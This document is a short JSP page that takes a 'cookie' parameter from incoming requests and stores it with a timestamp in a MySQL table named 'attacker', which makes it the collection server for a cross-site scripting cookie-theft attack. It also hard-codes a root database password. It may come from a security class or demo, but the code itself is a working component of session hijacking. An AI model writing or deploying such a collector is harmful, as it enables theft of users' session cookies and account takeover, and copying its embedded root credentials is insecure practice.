<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <%@ page import= "java.io.IOException" %>
	<%@ page import ="java.io.PrintWriter" %>
	<%@ page import ="java.sql.*" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
</head>
<body>

<% String cookie = request.getParameter("cookie");
try {
	System.out.println("Cookie: " +cookie);
	if(cookie!=null)
	{
	Class.forName("com.mysql.jdbc.Driver");
	String url="jdbc:mysql://localhost:3306/form?allowMultiQueries=true";
	String username="root";
	String password="Harsha.8";
	Connection conn=DriverManager.getConnection(url,username,password);
    System.out.println("Cookie: "+cookie);
    PreparedStatement ps = conn.prepareStatement("insert into attacker (cookie, cookietime) values (?,sysdate())");
    ps.setString(1, cookie);
    int i= ps.executeUpdate();
    ps.close();
    conn.close();
	}
}
	
catch (Exception e) 
{
    e.printStackTrace();
}
%>
</body>
</html>